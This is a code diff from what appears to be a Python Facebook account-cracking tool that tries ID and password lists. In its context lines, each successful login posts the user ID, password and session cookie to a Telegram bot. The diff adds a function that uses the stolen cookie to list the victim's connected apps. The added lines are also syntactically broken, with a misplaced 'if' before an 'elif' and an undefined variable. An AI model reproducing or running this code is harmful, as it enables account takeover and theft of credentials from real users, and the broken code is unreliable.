@@ -982,39 +982,35 @@ def xp():
   input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 
 def cek_apk(session, coki):
-    # Check active apps
-    active_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki})
-    active_apps_soup = BeautifulSoup(active_apps_response.text, "html.parser")
-    active_forms = active_apps_soup.find_all("form", method="post")
-    active_games = []
-    for form in active_forms:
-        game_names = form.find_all("h3")
-        for game_name in game_names:
-            active_games.append(game_name.text.strip())
+    try:
+        # Check active apps
+        active_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki})
+        active_apps_soup = BeautifulSoup(active_apps_response.content, "html.parser")
+        active_apps = active_apps_soup.find_all("div", class_="k")
 
-    if len(active_games) == 0:
-        print("\n[!] Sorry, there are no active apps.")
-    else:
-        print("\n[🎮] ☆ Your Active Apps ☆:")
-        for idx, game in enumerate(active_games, 1):
-            print(f"[{idx}] {game}")
+        if not active_apps:
+            print("\n[!] Sorry, there are no active apps.")
+        else:
+            print("\n[🎮] ☆ Your Active Apps ☆:")
+            for idx, app in enumerate(active_apps, 1):
+                app_name = app.find("h3").text.strip()
+                print(f"[{idx}] {app_name}")
 
-    # Check inactive apps
-    inactive_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki})
-    inactive_apps_soup = BeautifulSoup(inactive_apps_response.text, "html.parser")
-    inactive_forms = inactive_apps_soup.find_all("form", method="post")
-    inactive_games = []
-    for form in inactive_forms:
-        game_names = form.find_all("h3")
-        for game_name in game_names:
-            inactive_games.append(game_name.text.strip())
+        # Check inactive apps
+        inactive_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki})
+        inactive_apps_soup = BeautifulSoup(inactive_apps_response.content, "html.parser")
+        inactive_apps = inactive_apps_soup.find_all("div", class_="k")
 
-    if len(inactive_games) == 0:
-        print("\n[!] Sorry, there are no expired apps.")
-    else:
-        print("\n[🎮] ◇ Your Expired Apps ◇:")
-        for idx, game in enumerate(inactive_games, 1):
-            print(f"[{idx}] {game}")
+        if not inactive_apps:
+            print("\n[!] Sorry, there are no expired apps.")
+        else:
+            print("\n[🎮] ◇ Your Expired Apps ◇:")
+            for idx, app in enumerate(inactive_apps, 1):
+                app_name = app.find("h3").text.strip()
+                print(f"[{idx}] {app_name}")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error checking apps: {e}")
  
 def follow(self, session, coki):
     # Make a GET request to the profile page
@@ -1129,8 +1125,9 @@ def m2(idf,pwv):
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
-            cek_apk(session, coki)
             break
+   if "c_user" in ses.cookies.get_dict().keys():
+            cek_apk(ses, koki)
    elif 'checkpoint' in log_cookies:
            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            coki1 = coki.split("1000")[1]
@@ -1251,6 +1248,8 @@ def m4(idf,pwv):
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
+   if "c_user" in ses.cookies.get_dict().keys():
+            cek_apk(ses, coki)
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
